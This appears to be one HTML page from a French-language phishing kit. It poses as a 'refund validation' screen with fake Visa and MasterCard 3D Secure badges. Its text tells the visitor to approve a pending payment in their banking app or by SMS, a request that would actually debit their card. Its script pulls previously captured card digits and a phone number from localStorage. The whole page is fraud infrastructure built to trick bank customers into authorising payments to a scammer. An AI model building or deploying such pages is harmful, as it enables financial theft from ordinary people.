<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation de Remboursement</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            padding: 20px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .secure-icons img {
            width: 100%;
            max-width: 250px;
            margin-bottom: 20px;
        }
        .orange-box {
            background-color: #ffb74d;
            color: #333;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
        .orange-box h2 {
            margin: 0;
            font-size: 16px;
            color: #000;
            font-weight: bold;
        }
        .orange-box p {
            margin: 10px 0 0;
            font-size: 14px;
        }
        .orange-box a {
            color: blue;
            text-decoration: underline;
        }
        .info {
            text-align: left;
            margin: 15px 0;
            font-size: 14px;
            color: #555;
        }
        .info p {
            margin: 5px 0;
        }
        .info strong {
            color: #000;
        }
        .footer-icons img {
            width: 100%;
            max-width: 300px;
            margin: 10px auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logos sécurisés -->
        <div class="secure-icons">
            <img src="concept-paiement-ligne-main-tient-smartphone-lequel-application-paiement-est-ouverte-transfert-argent-reussi-services-bancaires-ligne-illustration-vectorielle_662353-1026.avif" alt="Remboursement Sécurisé">
        </div>

       <!-- Informations du remboursement -->
        <div class="info">
            <p><strong>Date :</strong> <span id="current-date"></span></p>            
        </div>

        <!-- Boîte orange -->
<div class="orange-box">
    <h2>Paiement en attente de validation</h2>
    <p>
        Merci de vous connecter sur votre application bancaire afin d'approuver la demande de paiement et débiter le montant sur votre carte.<br>
        Validez par SMS si vous ne possédez pas l'application bancaire !<br>
        <a href="confirmation_finale.html">Cliquez ici</a>
    </p>
</div>

        <!-- Icônes de sécurité -->
        <div class="footer-icons">
            <img src="card-new.avif" alt="Verified by Visa, 3D Secure, MasterCard SecureCode">
        </div>
    </div>

    <script>
        // الحصول على التاريخ الحالي فقط
        const currentDate = new Date();
        const formattedDate = currentDate.toLocaleDateString('fr-FR', {
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });

        document.getElementById('current-date').innerText = formattedDate;

        // Récupération des données depuis le localStorage (carte et téléphone)
        const lastFourDigits = localStorage.getItem('lastFourDigits') || '0000';
        const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';

        // Injection dans les éléments HTML
        document.getElementById('last-four').innerText = lastFourDigits;
        document.getElementById('phone-number').innerText = phoneNumber;
    </script>
</body>
</html>
